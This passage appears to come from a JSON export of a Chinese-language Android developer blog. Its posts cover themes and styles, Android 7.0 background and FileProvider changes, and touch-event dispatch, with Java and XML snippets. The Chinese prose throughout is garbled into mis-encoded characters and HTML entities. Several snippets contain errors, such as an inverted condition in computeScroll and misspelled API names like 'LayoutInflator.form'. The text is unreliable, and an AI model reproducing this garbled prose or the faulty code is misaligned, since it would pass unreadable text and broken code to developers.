&quot;colorPrimary&quot;&gt;@color/red&lt;/item&gt; &lt;/syle&gt; æ³¨æ„è¿™é‡Œæ²¡æœ‰android: å‰ç¼€ï¼ŒAppCompaté’ˆå¯¹API21ä¹‹å‰çš„ç‰ˆæœ¬å®šä¹‰äº†è‡ªå·±çš„ä¸€å¥—èµ„æºã€‚ å†ä¸¾ä¸ªä¾‹å­ åœ¨values/attrs.xmlä¸­ &lt;attr name:&quot;myAttribute&quot; format=&quot;dimension&quot;/&gt; åœ¨values/themes.xmlä¸­ &lt;style name = &quot;MyTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name=&quot;myAttribute&quot;&gt;4dp&lt;/item&gt; è¿™å°±æ˜¯å®é™…ä½¿ç”¨çš„Theme &lt;/style&gt; åœ¨values/styles.xmlä¸­ &lt;style name=&quot;MyStyle&quot;&gt; &lt;item name=&quot;android:padding&quot;&gt;?attr/myAttribute&lt;/item&gt; &lt;/style&gt; å®é™…æ“ä½œä¸­ åœ¨layoutæ–‡ä»¶ä¸­ï¼Œé€šè¿‡å°†ä¸€ä¸ªé•¿åº¦ï¼Œé¢œè‰²å®šä¹‰ä¸º?attrçš„æ–¹å¼ï¼Œå°±ä¼šå»å½“å‰çš„Themeä¸­å¯»æ‰¾ç›¸å¯¹åº”çš„attributeï¼Œè¿™å°±æ˜¯é»‘å¤œæ¨¡å¼åˆ‡æ¢çš„åŸç† è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰€æœ‰éandroid nameSpaceçš„attribute Nameéƒ½æ˜¯globalçš„ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªlibraryå®šä¹‰äº†ç›¸åŒçš„attribute Nameï¼Œå°†æ— æ³•ç¼–è¯‘é€šè¿‡ã€‚ Styleå¯ä»¥é€šè¿‡?attrçš„æ–¹å¼å¼•ç”¨Themeä¸­çš„èµ„æº 5 .è·å–Themecontext.getTheme().resolveAttribute(R.attr.dialogTheme,outValue,true) åœ¨Viewä¸­ TypedArray a = context.obtainStyledAttributes(attrs,com.android.internal.R.styleable.ImageView,defStyleAttr,defStyleRes) int alpha = a.getInt( com.android.internal.R.styleable.ImageView_drawableAlpha,255) Activityæœ‰ä¸€ä¸ªsetTheme(int themeResId)æ–¹æ³•ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯å–ä»£åŸå…ˆçš„Theme,åªæ˜¯åœ¨åŸæœ‰çš„Themeä¸Šapplyäº†ã€‚æ‰€ä»¥è¿™ä¸ªå‘½åä¸ç®—å¤ªå¥½ã€‚Activityå†…éƒ¨ä¼šåœ¨onCreate()å‰è°ƒç”¨setTheme(ä½ å†™åœ¨manifesté‡Œé¢çš„Theme) 6. v21çš„é—®é¢˜åœ¨values/styles.xmlä¸­ &lt;style name=&quot;BaseToolbar&quot;/&gt; åœ¨values-v21/styles.xmlä¸­ &lt;style name= &quot;BaseToolbar&quot;&gt; &lt;item name = &quot;android:elevation&quot;&gt;4dp&lt;/item&gt; &lt;/style&gt; elevationæ˜¯21ä»¥ä¸Šapiæ‰æœ‰çš„å±æ€§ï¼Œlintä¼šæç¤ºé—®é¢˜ è¿™æ ·ï¼Œåœ¨values/styles.xmlä¸­ &lt;style name = &quot;Toolbar&quot; parent = &quot;BaseToolbar&quot;/&gt; lintå°±ä¸ä¼šé£™é»„äº†ï¼Œç›´æ¥å¼•ç”¨Toolbarå³å¯ é€šè¿‡è¿™ç§ç»§æ‰¿çš„æ–¹å¼èƒ½å¤Ÿåœ¨è‡ªå·±çš„Themeä¸­ä½¿ç”¨ç»Ÿä¸€çš„themeï¼Œé’ˆå¯¹ä¸åŒçš„è¿è¡Œæ—¶ç‰ˆæœ¬ç¡®å®šæœ€ç»ˆè¿è¡Œçš„Themeã€‚ 7 . ThemeOverlayThemeOverlay.Material.Light ThemeOverlay.Material.Dark //etc ... ç”¨äºæ·»åŠ åˆ°ç°æœ‰çš„Themeä¸Šï¼Œä¾‹å¦‚Theme.Material.LightåªåŒ…å«color relevant to a light Themeï¼Œä¸ä¼šæ”¹å˜åŸæœ‰Themeçš„window Attributesã€‚æŸ¥çœ‹æºç ï¼Œåªæ˜¯å®Œæ•´çš„Themeä¸­çš„ä¸€å°éƒ¨åˆ†attributeã€‚ 8. å¸¸è§é”™è¯¯ ä½œä¸ºThemeä¸­å¼•ç”¨çš„styleå¿…é¡»è¦æœ‰ä¸€ä¸ªparent ä¾‹å¦‚ åœ¨AppThemeä¸­ &lt;item name = &quot;android:editTextStyle&quot;&gt;@style/MyEditTextStyle&lt;/item&gt; &lt;style name= &quot;MyEditTextStyle&quot;&gt; &lt;item name= &quot;android:fontFamily&quot;&gt; sans-serif-medium &lt;/item&gt; &lt;/style&gt; è¿™æ ·åšçš„ç»“æœå°†æ˜¯æ‰€æœ‰çš„EditTextéƒ½ä¼šå¤±å»åŸºæœ¬çš„å±æ€§ defStyleAttr vs defStyleRes å¸¸è§äº ObtainStyledAttributes(AttributeSet set,int []attrs, int defStyleAttr,int defStyleRes) ç›´æ¥è§£é‡Šï¼š defStyleAttr: The attr in your theme which points to the default style eg: R.attr.editTextStyle defStyleRes: The resource ID of the default style eg:R.style.Widget_Material_EditText ObtainStyledAttributesæŸ¥æ‰¾Valueæ—¶è¯»å–çš„é¡ºåºå¦‚ä¸‹ 1. Value in the AttributeSet 2. Value in the explicit style 3. Default style specified in defStyleRes 4. Default style specified in defStyleAttr 5. Base value in this theme æ³¨æ„æœ€åä¸€æ¡ï¼Œä¸‡ä¸€åœ¨manifestsæ–‡ä»¶ä¸­å‡ºç°è¿™ç§ä¸œè¥¿ &lt;Style name = &quot;AppTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;...&lt;/item&gt; &lt;/Style&gt; è¿™æ„å‘³ç€ Any View which doesnâ€™t have a background set ,will use the themeâ€™s value , SHIT! 9. å®¹æ˜“é‡åˆ°çš„é”™è¯¯ç¼–è¯‘ä¸é€šè¿‡çš„æƒ…å†µ Error retrieving parent for item: No resource found that matches the given name &#39;@android:style/TextAppearance.Holo.Widget.ActionBar.Title&#39; 10. æœ€åï¼Œä¸€ç‚¹å¥½ç©çš„Context themedContext = new ContextThemeWrapper(baseContext,R.style.MyTheme); View view = LayoutInflator.form(themedContext) .inflate(R.layout.some_layout,null); //æˆ–è€… View view = new View(themedContext); //ç”Ÿæˆçš„Viewå°±ä¼šå¸¦æœ‰MyThemeä¸­çš„å±æ€§ï¼ŒåŠ¨æ€è®¾ç½®ã€‚ è€Œè¿™ä¹Ÿæ˜¯AppComPatå¯¹äºAPI 21ä»¥ä¸‹ç‰ˆæœ¬è¿›è¡Œå…¼å®¹çš„åŸç†ç¿»äº†ä¸€ä¸‹æ–‡æ¡£ï¼šContextThemeWrapper : Added in API level 1 è¿™ä¸€ç‚¹AppCompatçš„ä½œè€…ä¹Ÿåœ¨2014å¹´çš„ä¸€ç¯‡ åšå®¢ä¸­æåˆ°äº†ã€‚ reference Daniel Lew View Constructor IO 2016","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"android 7.0ä¸€äº›æ–°ç‰¹æ€§ä»‹ç»åŠé€‚é…æ–¹æ¡ˆ","date":"2016-10-08T03:02:26.000Z","path":"2016/10/08/2016-10-08-android-7-0-new-features/","text":"Google I/O 2016ä¸Šçš„Whatâ€™s new in Androidä»‹ç»çš„æ¯”è¾ƒå…¨é¢ï¼ŒMultiWindowã€Notificationã€ConstraintLayoutç­‰éƒ½æ¯”è¾ƒç®€å•ã€‚è¿™é‡Œæ‹å‡ºæ¥å¼€å‘è€…ä¸å¾—ä¸æ³¨æ„çš„å‡ ç‚¹æ¥ä»‹ç»ã€‚ 1. BackGround OptimizationCONNECTIVITY_CHANGE(å¾ˆå¤šåº”ç”¨å–œæ¬¢åœ¨Manifesté‡Œæ³¨å†Œè¿™ä¸ªBroadcastReceiverï¼Œå¯¼è‡´ç½‘ç»œå˜åŒ–æ—¶ï¼Œä¸€å¤§å †åº”ç”¨éƒ½è¢«å”¤é†’ï¼Œè€Œramä¸­æ— æ³•åŒæ—¶å­˜åœ¨è¿™ä¹ˆå¤šprocessï¼Œç³»ç»Ÿä¸å¾—ä¸kill old processï¼Œç”±æ­¤å¯¼è‡´memory thrashing) åŒæ—¶è¢«ç§»é™¤çš„è¿˜æœ‰NEW_PICTURE,NEW_VIDEO. å…·ä½“æ¥è¯´: å¯¹äºtargeting Nçš„åº”ç”¨ï¼Œåœ¨manifestæ–‡ä»¶ä¸­å£°æ˜ static broadcastReceiverï¼Œç›‘å¬CONNECTIVITY_CHANGEå°†ä¸ä¼šå”¤é†’åº”ç”¨ã€‚å¦‚æœåº”ç”¨æ­£åœ¨è¿è¡Œï¼Œä½¿ç”¨context.registerReceiverï¼Œå°†ä»èƒ½å¤Ÿæ¥å—åˆ°broadcastã€‚ä½†ä¸ä¼šè¢«å”¤é†’ã€‚ è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨JobScheduleræˆ–firebase jobDispatcherã€‚ä¸¾ä¸ªä¾‹å­: public static final int MY_BACKGROUND_JOB = 0; public static void scheduleJob(Context context){ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { JobScheduler js = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE); JobInfo job = new JobInfo.Builder( MY_BACKGROUND_JOB, new ComponentName(context,MyJobService.class)). setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED). setRequiresCharging(true). build(); js.schedule(job); } } å¯¹äºNEW_PICTURE,NEW_VIDEO. æ‰€æœ‰åœ¨7.0 Nugetä»¥ä¸Šè®¾å¤‡è¿è¡Œçš„åº”ç”¨(æ— è®ºæ˜¯å¦ target N) éƒ½ä¸ä¼šæ”¶åˆ°è¿™äº›broadcastã€‚ç®€å•æ¥è¯´ï¼Œfully deprecated !!! è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨JobScheduler(å¯ä»¥ç›‘å¬contentProvider change)NEW_PICTUREçš„å¤„ç†(è¿™æ®µä»£ç åªåœ¨API24ä»¥ä¸Šå­˜åœ¨ï¼Œæ‰€ä»¥åŠ äº†ç‰ˆæœ¬åˆ¤æ–­) public static void scheduleJob(Context context){ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) { JobScheduler js = context.getSystemService(JobScheduler.class); JobInfo.Builder builder = new JobInfo.Builder( R.id.schedule_photo_jobs, new ComponentName(context,PhotoContentJob.class)); builder.addTriggerContentUri( new JobInfo.TriggerContentUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS) ); js.schedule(builder.build()); } } å‚è€ƒyoutubeä¸Šè°·æ­Œå‘˜å·¥çš„æ¼”è®² 2. æ–‡ä»¶ç³»ç»Ÿçš„æƒé™æ›´æ”¹(FileProvider) File storage permission change ç®€å•æ¥è¯´å°±æ˜¯Uri.fromFile(file://URI)ä¸èƒ½å†ç”¨äº†ï¼Œéœ€è¦ä½¿ç”¨FileProviderï¼Œè¿™ä¸»è¦æ˜¯ä¸ºäº†6.0å¼€å§‹å¼•è¿›çš„permission model è€ƒè™‘çš„ï¼Œstorage permissionä¾‹å¦‚WRITE_EXTERNAL_STORAGEè¿™ç§éƒ½å·²ç»å±äºDangerous permissionäº†ã€‚ ä¸€ä¸ªå¸¸è§çš„åœºæ™¯å°±æ˜¯è°ƒç”¨ç³»ç»Ÿç›¸æœºæ‹ç…§ï¼Œç»™Intentè®¾ç½®ä¸€ä¸ªuriï¼Œåœ¨7.0ä¸Šç›´æ¥ç”¨Uri.FromFileä¼šå´© éœ€è¦é€šè¿‡FileProvideræä¾›Uri,å†™äº†ä¸€ä¸ªDemoï¼Œä½¿ç”¨FileProviderä¼ é€’æ–‡ä»¶ç»™å¦ä¸€ä¸ªAppã€‚ å¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„å°±æ˜¯DownloadManagerè®¿é—®COLUMN_LOCAL_FILENAMEä¼šæŠ¥é”™ï¼Œè¿™ä¸ªä¸å¸¸è§ã€‚ æ›´æ–°è½¬çœ¼Android 9éƒ½å‡ºæ¥äº†ï¼ŒAndroid9ä¸­é™åˆ¶äº†ç§æœ‰å‡½æ•°çš„è°ƒç”¨ï¼Œå°±æ˜¯åå°„ä¸å¥½ç”¨äº†ã€‚æœ‰ä¸€ç§ä½¿ç”¨unSafeæ“ä½œè§„é¿çš„æ–¹å¼ å‚è€ƒ Docs youtube Andrioid 7.0é€‚é…å¿ƒå¾— Android 7.0 Behavior Changes","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"å®‰å“äº‹ä»¶åˆ†å‘æµç¨‹","date":"2016-10-06T23:32:30.000Z","path":"2016/10/06/2016-10-06-touch-event-distribution/","text":"å›¾1 é»˜è®¤æƒ…å†µä¸‹äº‹ä»¶ä¼ é€’çš„è·¯å¾„ Touchäº‹ä»¶å§‹äºACTION_DOWN, ç»ˆæ­¢äºACTION_UP, è¿™å…¶ä¸­å¯èƒ½ä¼šä¼´éšç€ACTION_MOVE,ACTION_CANCELç­‰ç­‰ã€‚ é¦–å…ˆæ¥å…³æ³¨ACTION_DOWNï¼Œç”¨æˆ·è§¦æ‘¸å±å¹•ï¼ŒMotionEventå¼€å§‹ä¼ é€’ï¼š Activity.dispatchTouchEvent ViewGroup.dispatchTouchEvent ViewGroup.onInterceptTouchEvent â€¦..ä¸­é—´çœç•¥nä¸ªè§†å›¾å±‚çº§ â€¦.&gt;&gt;&gt; View.dispatchTouchEvent View.onTouchEvent â€‹ â€¦.ä¸­é—´çœç•¥nä¸ªè§†å›¾å±‚çº§â€¦.&gt;&gt;&gt; ViewGroup.onTouchEvent Activity.onTouchEvent è¿™ä¹Ÿå°±æ˜¯æœ¬æ–‡æœ€å¼€å§‹çš„å›¾1å†…æè¿°çš„å†…å®¹ï¼Œæ³¨æ„ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹(å„ä¸ªå‡½æ•°éƒ½è¿”å›superçš„æƒ…å†µä¸‹)æ‰èƒ½å°†è¿™ä¸ªä»ä¸Šåˆ°ä¸‹ï¼Œå†ä»ä¸‹åˆ°ä¸Šçš„å¾ªç¯èµ°å®Œæ•´ã€‚è¿™é‡Œè®¨è®ºçš„è¿˜åªæ˜¯ACTION_DOWNã€‚ æ¥ä¸‹æ¥çœ‹ACTION_DOWNä¸‹å‘è¿‡ç¨‹ä¸­å„ä¸ªå‡½æ•°è¿”å›å€¼å¯¹äºæ•´ä¸ªä¼ é€’é“¾èµ°å‘çš„å½±å“ï¼Œæˆ‘ä»¬åœ¨overrideè¿™äº›å‡½æ•°çš„æ—¶å€™ï¼Œè¿”å›å€¼æ— éä¸‰ç§ï¼š true , false ,super return trueï¼šACTION_DOWNäº‹ä»¶åˆ†å‘åˆ°æ­¤ç»“æŸ(æ¶ˆè´¹æ‰)ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè¦æ³¨æ„çš„æ˜¯onInterceptTouchEvent,è¿”å›trueè¡¨ç¤ºè¯¥ViewGroupæ‰“ç®—å°†äº‹ä»¶æ‹¦æˆªä¸‹æ¥ï¼Œåº•å±‚Viewå°†æ¥æ”¶åˆ°ä¸€ä¸ªACTION_CANCELï¼Œäº‹ä»¶ä¼ é€’ç»™è¯¥ViewGroupçš„onTouchEvent return false: å¯¹äºdispatchTouchEventï¼Œè¿”å›falseè¡¨æ˜ä¸å†å‘ä¸‹åˆ†å‘ï¼ŒACTION_DOWNå‘é€åˆ°ä¸Šä¸€å±‚ViewGroup(Activity)çš„OnTouchEventï¼›å¯¹äºonInterceptTouchEvent,è¿”å›falseè¡¨æ˜è¯¥ViewGroupä¸æ‰“ç®—æ‹¦æˆªï¼Œç»§ç»­ä¸‹å‘ï¼Œå¯¹äºonTouchEventï¼Œè¿”å›falseï¼Œäº‹ä»¶ç»§ç»­ä¸Šä¼ è‡³ä¸Šä¸€å±‚çº§ViewGroupçš„OnTouchEvent ã€‚ return super : å®Œæˆæ•´ä¸ªä¼ é€’é“¾ï¼Œå°±åƒå›¾1ä¸­å±•ç¤ºçš„ä¸€æ ·ã€‚ å›¾2 æ¥è‡ªå›¾è§£å®‰å“äº‹ä»¶åˆ†å‘æœºåˆ¶ å®Œç¾åœ°è§£é‡Šäº†äº‹ä»¶åˆ†å‘å„ä¸ªæµç¨‹ä¸­è¿”å›å€¼å¯¹äºäº‹ä»¶ä¼ é€’çš„å½±å“ã€‚ å›¾3 æ¥è‡ªå›¾è§£å®‰å“äº‹ä»¶åˆ†å‘æœºåˆ¶ æ¥ä¸‹æ¥çœ‹ACTION_DOWNæ—¶è¿”å›å€¼å¯¹äºåç»­ACTION_MOVE,ACTION_UPç­‰ä¼ é€’è·¯å¾„çš„å½±å“ï¼š é¦–å…ˆä»‹ç»æ¦‚å¿µï¼š gesture = ACTION_DOWN+ a bounch of ACTIONS +ACTION_UP ä¸€ä¸ªgesture(æ‰‹åŠ¿)å³ä»æ‰‹æŒ‡æŒ‰ä¸‹åˆ°æ‰‹æŒ‡ç¦»å¼€è¿™æ®µè¿‡ç¨‹ä¸­æ‰€æœ‰çš„äº‹ä»¶çš„é›†åˆ,swipe,click,flingç­‰ç­‰ ACTION_DWONå‘ç”Ÿæ—¶ï¼Œandroidå°†ä¼šåœ¨å½“å‰touchåŒºåŸŸæ‰€æœ‰çš„Viewä¸­ç¡®å®šä¸€ä¸ªTouch Target,åè€…å°†æ¥ç®¡æ­¤æ¬¡gestureä¸­çš„æ‰€æœ‰ACTION_MOVE,ACTION_UPã€‚ï¼ˆè¿™æ ·åšæœ‰ä¸¤ç‚¹å¥½å¤„ï¼š1.ä¸€æ—¦ç¡®å®šäº†Touch Targetï¼Œç³»ç»Ÿå°†ä¼šæŠŠæ‰€æœ‰çš„åç»­äº‹ä»¶å…¨éƒ¨ä¼ é€’åˆ°è¿™ä¸ªtargetä¸ºæ­¢ï¼Œè¿™å°±é¿å…äº†å¤æ‚çš„view traversingï¼Œæœ‰åŠ©äºæå‡æ€§èƒ½; 2ï¼šä¼ é€’é“¾ä¸­ç¬¬ä¸€ä¸ªèƒ½å¤Ÿæˆä¸ºTouch Targetçš„Viewå°†ç‹¬ç«‹å¤„ç†åç»­äº‹ä»¶ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–Viewå—åˆ°å½±å“ï¼‰ã€‚åœ¨åœ¨ä¸€ä¸ªgestureå¼€å§‹æ—¶ï¼ŒOnTouchEventï¼ˆACTION_DOWNï¼‰è¿”å›true,å°±æ„å‘³ç€æˆä¸ºTouchTargetã€‚å€Ÿç”¨ç®€ä¹¦ä½œè€…çš„æ€»ç»“: ACTION_DOWNäº‹ä»¶åœ¨å“ªä¸ªæ§ä»¶æ¶ˆè´¹äº†ï¼ˆreturn trueï¼‰ï¼Œ é‚£ä¹ˆACTION_MOVEå’ŒACTION_UPå°±ä¼šä»ä¸Šå¾€ä¸‹ï¼ˆé€šè¿‡dispatchTouchEventï¼‰åšäº‹ä»¶åˆ†å‘å¾€ä¸‹ä¼ ï¼Œå°±åªä¼šä¼ åˆ°è¿™ä¸ªæ§ä»¶ï¼Œä¸ä¼šç»§ç»­å¾€ä¸‹ä¼ ï¼Œå¦‚æœACTION_DOWNäº‹ä»¶æ˜¯åœ¨dispatchTouchEventæ¶ˆè´¹ï¼Œé‚£ä¹ˆäº‹ä»¶åˆ°æ­¤ä¸ºæ­¢åœæ­¢ä¼ é€’ï¼Œå¦‚æœACTION_DOWNäº‹ä»¶æ˜¯åœ¨onTouchEventæ¶ˆè´¹çš„ï¼Œé‚£ä¹ˆä¼šæŠŠACTION_MOVEæˆ–ACTION_UPäº‹ä»¶ä¼ ç»™è¯¥æ§ä»¶çš„onTouchEventå¤„ç†å¹¶ç»“æŸä¼ é€’ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œäº‹ä»¶ä¾æ—§æ˜¯ä»ä¸Šå¾€ä¸‹ä¸€ç›´åˆ†å‘åˆ°TouchTargetè¿™ä¸€å±‚ï¼Œåªæ˜¯åœ¨TouchTargetè¿™ä¸€å±‚è¢«æ¶ˆè´¹äº†ï¼Œä¸”ä¸å†å¾€ä¸Šä¼ é€’(æœ‰åŠ©äºæ€§èƒ½æå‡)ã€‚çˆ¶ViewGroupçš„dispatchTouchEventå’ŒonInterceptTouchEventä¾æ—§ä¼šå…ˆäºTouchTargetæ¥æ”¶åˆ°ACTION_MOVEç­‰äº‹ä»¶ã€‚æ‰€ä»¥æ­¤æ—¶å¦‚æœçˆ¶ViewGroupåœ¨onInterceptTouchEventä¸­è¿”å›trueï¼Œçˆ¶ViewGroupå°†å–ä»£åŸæœ‰çš„å­Viewæˆä¸ºæ–°çš„ViewTarget,åç»­äº‹ä»¶(ACTION_MOVEç­‰)å°†ä¼ é€’åˆ°è¯¥çˆ¶ViewGroupä¸­ï¼Œè€Œå­Viewå°†æ”¶åˆ°ACTION_CANCEL(å¯ä»¥åœ¨è¿™é‡Œåšä¸€äº›æ¢å¤çŠ¶æ€çš„å·¥ä½œï¼Œæ¯”å¦‚ä»foucusedå˜æˆunfocused)ã€‚ä¸¾ä¸€ä¸ªä¾‹å­ï¼šåœ¨ScrollView(ä¸æ˜¯Androidè‡ªå¸¦çš„é‚£ä¸ª)ä¸­æ”¾ä¸€ä¸ªButtonï¼ŒACTION_DOWNæ—¶ï¼ŒBUTTONè¡¨ç¤ºå¯ä»¥å¤„ç†ACTION_DOWN,å› ä¸ºè¿™å¯èƒ½ä¼šæ˜¯ä¸€æ¬¡clickï¼Œäºæ˜¯Buttonå°±æˆäº†TouchTargetï¼Œåç»­äº‹ä»¶å°†ä¸ä¼šä¼ é€’åˆ°ScrollViewä¸­ï¼ŒScrollViewä¹Ÿå°±æ— æ³•æ»‘åŠ¨ã€‚ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåœ¨ScrollViewçš„onInterceptTouchEventä¸­ï¼Œå¦‚æœçœ‹åˆ°ACTION_DWONï¼Œè¿”å›false(ç‚¹å‡»äº‹ä»¶å¯¹äºæ»‘åŠ¨æ¯«æ— æ„ä¹‰)ï¼Œä½†å¦‚æœçœ‹åˆ°ACTION_MOVE(æ»‘åŠ¨äº‹ä»¶),è¿”å›trueå¹¶æˆä¸ºæ–°çš„TouchTargetã€‚æ³¨æ„æ˜¯åœ¨OnInterceptTouchEventä¸­æ‹¦æˆªè€Œä¸æ˜¯dispatchTouchEventä¸­æ‹¦æˆªï¼Œåè€…ä¼šå°†äº‹ä»¶ä¼ é€’åˆ°ä¸Šå±‚ViewGroupçš„onTouchEventä¸­ã€‚æƒ³æƒ³çœ‹ï¼Œä¸å»dispatchäº†ã€ã€ã€androidè¿™ç§Apièµ·åè¿˜æ˜¯å¯ä»¥çš„ã€‚ #onClickäº‹ä»¶æ¥ä¸‹æ¥çœ‹onClickå’ŒonLongClickï¼ŒonTouchListenerè¿™ç±»äº‹ä»¶ä½•æ—¶è§¦å‘ é¦–å…ˆæ˜¯Viewçš„dispatchTouchEventæºç éƒ¨åˆ† case MotionEvent.ACTION_UP: boolean prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != 0; if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0 || prepressed) { // take focus if we don&#39;t have it already and we should in // touch mode. boolean focusTaken = false; if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) { focusTaken = requestFocus(); } if (prepressed) { // The button is being released before we actually // showed it as pressed. Make it show the pressed // state now (before scheduling the click) to ensure // the user sees it. setPressed(true, x, y); } if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. if (mPerformClick == null) { mPerformClick = new PerformClick(); } if (!post(mPerformClick)) { performClick(); } } } if (mUnsetPressedState == null) { mUnsetPressedState = new UnsetPressedState(); } if (prepressed) { postDelayed(mUnsetPressedState, ViewConfiguration.getPressedStateDuration()); } else if (!post(mUnsetPressedState)) { // If the post failed, unpress right now mUnsetPressedState.run(); } removeTapCallback(); } mIgnoreNextUpEvent = false; break; æ‰€ä»¥onClickäº‹ä»¶æ˜¯åœ¨ACTION_UPä¸­æ‰§è¡Œçš„ è€ŒLongClickäº‹ä»¶è¦çœ‹ACTION_DOWNäº† case MotionEvent.ACTION_DOWN: mHasPerformedLongPress = false; if (performButtonActionOnTouchDown(event)) { break; } // Walk up the hierarchy to determine if we&#39;re inside a scrolling container. boolean isInScrollingContainer = isInScrollingContainer(); // For views inside a scrolling container, delay the pressed feedback for // a short period in case this is a scroll. if (isInScrollingContainer) { mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) { mPendingCheckForTap = new CheckForTap(); } mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout()); } else { // Not inside a scrolling container, so show the feedback right away setPressed(true, x, y); checkForLongClick(0, x, y); } break; å…³é”®çœ‹checkForLongClick, ä¸è´´ä»£ç äº†ï¼Œç»“è®ºæ˜¯ï¼šåœ¨ACTION_DOWNäº‹ä»¶è¢«æ•æ‰åï¼Œç³»ç»Ÿä¼šå¼€å§‹è§¦å‘ä¸€ä¸ªpostDelayedæ“ä½œï¼Œdelayçš„æ—¶é—´ä¸º ViewConfiguration.getLongPressTimeout() - delayOffset ï¼ˆè¿™ä¸ªå€¼åœ¨Eclair2.1ä¸Šä¸º500msï¼‰ï¼Œ500msåä¼šè§¦å‘CheckForLongPressçº¿ç¨‹çš„æ‰§è¡Œï¼š æƒ³æƒ³çœ‹ï¼ŒLongClickäº‹ä»¶æ˜¯åœ¨DOWNæ—¶å¼€å§‹è®¡æ—¶ï¼Œ500mså‡è®¾ï¼ŒOnClickæ˜¯åœ¨UPæ˜¯å‘ç”Ÿï¼Œæ‰€ä»¥å®Œå…¨æœ‰å¯èƒ½åŒæ—¶å‘ç”ŸOnClickå’ŒOnLongClickã€‚è¿™é‡Œçœ‹åˆ°å½“onLongClickçš„è¿”å›å€¼ä¸ºtrueæ—¶ï¼Œ mHasPerformedLongPress = true ,ä»”ç»†çœ‹ACTION_UPä¸­ï¼Œå¦‚æœHasPerformLongPress==trueï¼Œå°±ä¸ä¼šèµ°åˆ°onClickäº‹ä»¶é‡Œã€‚æ‰€ä»¥åœ¨onLongClickListeneré‡Œéœ€è¦è¿”å›ä¸€ä¸ªbooleanå€¼çš„åŸå› å°±è¿™ä¹ˆç®€å•ã€‚ if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. if (mPerformClick == null) { mPerformClick = new PerformClick(); } if (!post(mPerformClick)) { performClick(); } } } æ¥ä¸‹æ¥æ˜¯OnTouchListenerï¼Œç›´æ¥ä¸Šç»“è®º: onTouchListeneré‡Œé¢çš„æ–¹æ³•æ˜¯åœ¨dispatchTouchEventé‡Œé¢è°ƒç”¨çš„ï¼Œå¹¶ä¸”å¦‚æœlisteneré‡Œé¢çš„onTouchè¿”å›trueï¼Œäº‹ä»¶å°†ä¸ä¼šå‘é€ç»™onTouchEventï¼Œå› æ­¤OnTouchListeneråŠ¿å¿…ä¼šä¼˜å…ˆçº§é«˜äºonClickå’ŒonLongClickã€‚ VelocityTrackervelocityTracker = VelocityTracker.obtain()ï¼› velocityTracker.addMovement(event); velocityTracker.computeCurrentVelocity(1); velocityTracker.getXVelocity(); velocityTracker.recycle(); å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒVelocityTrackerå†…éƒ¨ä½¿ç”¨äº†å¤§é‡çš„nativeæ–¹æ³•ï¼Œæ‰€ä»¥æ‰§è¡Œé€Ÿåº¦æ¯”javaè¦å¿«å¾ˆå¤šã€‚ å®ç°Flingæ•ˆæœprivate void onFling(float velocityX,float velocityY){ scroller.fling(getScrollX(),getScrollY(),(int)-velocityX (int)-velocityY,minScrollX,maxScrollX, minScrollY,maxScrollY); invalidate(); } @overdide// è¿™æ˜¯æ¯ä¸ªViewéƒ½æœ‰çš„æ–¹æ³• private void computeScroll(){ if(scroller.isFinished()){ scroller.computeScrollOffset(); scrollTo(scroller.getCurrX(),scroller.getCurrY()); postInvalidateOnAnimation(); } } æ•è·åŒå‡»äº‹ä»¶public class MyView extends View { GestureDetector gestureDetector; public MyView(Context context, AttributeSet attrs) { super(context, attrs); // creating new gesture detector gestureDetector = new GestureDetector(context, new GestureListener()); } // skipping measure calculation and drawing // delegate the event to the gesture detector @Override public boolean onTouchEvent(MotionEvent e) { return gestureDetector.onTouchEvent(e); } private class GestureListener extends GestureDetector.SimpleOnGestureListener { @Override public boolean onDown(MotionEvent e) { return true; } // event when double tap occurs @Override public boolean onDoubleTap(MotionEvent e) { float x = e.getX(); float y = e.getY(); Log.d(&quot;Double Tap&quot;, &quot;Tapped at: (&quot; + x + &quot;,&quot; + y + &quot;)&quot;); return true; } } } æœ€åæ˜¯å…³äºViewConfigurationçš„ä¸€äº›å¸¸é‡è·å–çš„é™æ€æ–¹æ³•ï¼š int getScaledTouchSlop(); (if Math.abs(xx+yy)&gt;mTouchSlop å°±å¯ä»¥è®¤ä¸ºæ˜¯æ»‘åŠ¨äº‹ä»¶äº†) /** * åŒ…å«äº†æ–¹æ³•å’Œæ 